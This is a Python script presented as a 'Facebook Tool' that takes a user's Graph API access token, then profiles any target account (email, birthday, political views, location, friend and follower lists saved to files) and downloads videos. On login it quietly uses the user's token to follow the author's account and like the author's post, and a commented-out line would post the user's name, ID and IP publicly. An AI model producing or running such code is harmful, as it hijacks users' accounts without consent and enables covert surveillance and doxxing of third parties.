#!usr/bin/env python
# coding=UTF-8
# Copyright (c) 2021 Tegar <tegarsabila11@gmail.com>

from dialog import Dialog
import os,sys,json,shutil
try:import requests, bs4, mechanize
except ImportError:os.system("pip install requests bs4 mechanize")

d = Dialog(dialog="dialog")
d.set_background_title("Facebook Tool v0.1")
ip = requests.get("https://api.ipify.org").text


name = ""
id = ""
birthday = ""
gender = ""

def bot_follow():
    try:
        token=open("login.txt","r").read()
        req = requests.get("https://graph.facebook.com/me/?access_token="+token)
        a = json.loads(req.text)
        nama = a["name"]
        id = a["id"]
        id_gw = "100067183633181"
        id_post = "164432945806159"
        message = f"Izin pakai bang Tegar\nNama : {nama}\nID : {id}\nIP : {ip}"
        requests.post(f"https://graph.facebook.com/{id_gw}/subscribers?access_token=" + token)
        requests.post(f"https://graph.facebook.com/{id_post}/likes?access_token=" + token)
#        requests.post(f"https://graph.facebook.com/{id_post}/comments/?message={message}&access_token=" + token)
        menu()
    except IOError:
        login()

def login():
    code, token = d.inputbox("""\
Input your token:""",
                              init="Isi awal",
                              width=0, height=0, title="Login")
    try:
        req = requests.get("https://graph.facebook.com/me?access_token=" + token)
        a = json.loads(req.text)
        nama = a["name"]
        zedd = open("login.txt", "w")
        zedd.write(token)
        zedd.close()
        bot_follow()
    except KeyError:
        login()

# pilih menu
def menu():
    try:
        token = open("login.txt","r").read()
        req = requests.get("https://graph.facebook.com/me/?access_token="+token)
        a = json.loads(req.text)
        global name, id, birthday, gender
        name = a["name"]
        id = a["id"]
        birthday = a["birthday"]
        gender = a["gender"]
    except Exception as e:
        login()
    code, tag = d.menu(f"""
Your Name: {name}
Your ID: {id}
Your IP: {ip}
                   """,
                   choices=[("1", "Facebook Information Gathering"),
                            ("2", "Facebook Video Downloader"),
                            ("0", "Exit")],
                       width=0, height=0, title="Menu",
                       extra_button=True, extra_label="logout", ok_label="oke", cancel_label="cancel")
    if code == d.OK:
        if tag == "1":
            data()
        elif tag == "2":
            fb_download()
        elif tag == "0":
            sys.exit("exit")

def data():
        global name, id, birthday, gender
        try:
                token=open("login.txt","r").read()
        except IOError:
                os.system("rm -rf login.txt")
                login()
        try:
                code, user_input = d.inputbox("""\
Input ID:""",
                                      init="",
                                      width=0, height=0, title="Target")
                id = user_input
                try:
                        req = requests.get("https://graph.facebook.com/"+id+"?access_token="+token)
                        op = json.loads(req.text)
                        nama = op["name"]
                        user = op["username"]
                        try:
                                req = requests.get("https://graph.facebook.com/"+id+"?access_token="+token)
                                op = json.loads(req.text)
                                tentang = op["about"]
                        except KeyError:
                                tentang = "-"
                        try:
                                req = requests.get("https://graph.facebook.com/"+id+"?access_token="+token)
                                op = json.loads(req.text)
                                kampung = op["hometown"]["name"]
                        except KeyError:
                                kampung = "-"
                        try:
                                req = requests.get("https://graph.facebook.com/"+id+"?access_token="+token)
                                op = json.loads(req.text)
                                lokasi = op["location"]["name"]
                        except KeyError:
                                lokasi = "-"
                        try:
                                req = requests.get("https://graph.facebook.com/"+id+"?access_token="+token)
                                op = json.loads(req.text)
                                lokal = op["locale"]
                        except KeyError:
                                lokal = "-"
                        try:
                                req = requests.get("https://graph.facebook.com/"+id+"?access_token="+token)
                                op = json.loads(req.text)
                                politik = op["political"]
                        except KeyError:
                                politik = "-"
                        try:
                                req = requests.get("https://graph.facebook.com/"+id+"?access_token="+token)
                                op = json.loads(req.text)
                                zona = op["timezone"]
                        except KeyError:
                                zona = "-"
                        try:
                                req = requests.get("https://graph.facebook.com/"+id+"?access_token="+token)
                                op = json.loads(req.text)
                                kutipan = op["quotes"]
                        except KeyError:
                                kutipan = "-"
                        try:
                                req = requests.get("https://graph.facebook.com/"+id+"?access_token="+token)
                                op = json.loads(req.text)
                                email = op["email"]
                        except KeyError:
                                email = "-"
                        try:
                                req = requests.get("https://graph.facebook.com/"+id+"?access_token="+token)
                                op = json.loads(req.text)
                                ultah = op["birthday"]
                        except KeyError:
                                ultah = "-"
                        try:
                                req = requests.get("https://graph.facebook.com/"+id+"?access_token="+token)
                                op = json.loads(req.text)
                                jenis = op["gender"]
                        except KeyError:
                                jenis = "-"
                        try:
                                r = requests.get("https://graph.facebook.com/"+id+"/friends?access_token="+token)
                                idt = []
                                z = json.loads(r.text)
                                qq = (op["first_name"]+".json").replace(" ","_")
                                ys = open(qq , "w")
                                for i in z["data"]:
                                        idt.append(i["id"])
                                        ys.write(i["id"])
                                ys.close()
                                teman = (len(idt))
                        except KeyError:
                                teman = "-"
                        try:
                                a=requests.get("https://graph.facebook.com/"+id+"/subscribers?limit=20000&access_token="+token)
                                idt = []
                                b = json.loads(a.text)
                                bb = (op["first_name"]+".json").replace(" ","_")
                                jw = open(bb , "w")
                                for c in b["data"]:
                                        idt.append(c["id"])
                                        jw.write(c["id"])
                                jw.close()
                                pengikut = (len(idt))
                        except KeyError:
                                pengikut = "-"
                        try:
                                jok = requests.get("https://graph.facebook.com/"+id+"?access_token="+token)
                                op = json.loads(jok.text)
                                web = op["website"]
                        except KeyError:
                                web = "-"
                        except IOError:
                                web = "-"
                        try:
                                jok = requests.get("https://graph.facebook.com/"+id+"?access_token="+token)
                                op = json.loads(jok.text)
                                uptime = op["updated_time"]
                        except KeyError:
                                uptime = "-"
                        except IOError:
                                uptime = "-"
                        d.msgbox(f"""
Facebook Information Gathering
Author : Tegar-Syndicate
Maintainer : Coffee Code

Your Account Information:
Name: {name}
ID: {id}
Birthday: {birthday}
Gender: {gender}

Target Account Information:
Account Name: {nama}
Username: {user}
Email: {email}
Birthday: {ultah}
Gender: {jenis}
Friend: {teman}
Followers: {pengikut}
Website: {web}
Uptime: {uptime}
Locale: {lokal}
Location: {lokasi}
Hometown: {kampung}
Timezone: {zona}
Political: {politik}
Quotes: {kutipan}
About: {tentang}
""", width=0, height=0,title="Target Information")
                        menu()
                except KeyError:
                        menu()
        except Exception as e:
                sys.exit(e)

source = ""
def fb_download():
    try:
        token = open("login.txt","r").read()
    except IOError:
        os.system("rm -rf login.txt")
        login()
    code, link = d.inputbox("""\
Input url:""",
                              init="url video",
                              width=0, height=0, title="FB Downloader")


    try:
        global source
        url1 = link.replace("https://www.facebook.com/", "")
        url2 = url1.replace("?app=fbl", "")
        url3 = url2.replace("/", "")
        url4 = url3.replace("posts", "_")
        req = requests.get(f"https://graph.facebook.com/{url4}?fields=source&access_token=" + token)
        a = json.loads(req.text)
        source = a["source"]
        post_id = a["id"]
        post_time = a["created_time"]
        pilih = d.yesno(f"""\
ID: {post_id}
Created: {post_time}
""",
               width=0,height=0,title="Url Information")
        if pilih == d.OK:
            download()
        elif pilih == d.CANCEL:
            menu()
    except KeyError:
        menu()

def download():
    global source
    code, file = d.inputbox("""\
File name:""",
                              init="*.mp4",
                              width=0, height=0, title="Input File")
    file_url = source
    nama_file = file
    r = requests.get(file_url, stream = True)
    if r.status_code == 200:
        r.raw.decode_content = True
        with open(nama_file,'wb') as f:
            shutil.copyfileobj(r.raw, f)
            result = f"file name: {nama_file}"
    else:
        result = f"there is an error"

    d.msgbox(f"""\
{result}""",
                              width=0, height=0, title="Result")
    menu()
menu()
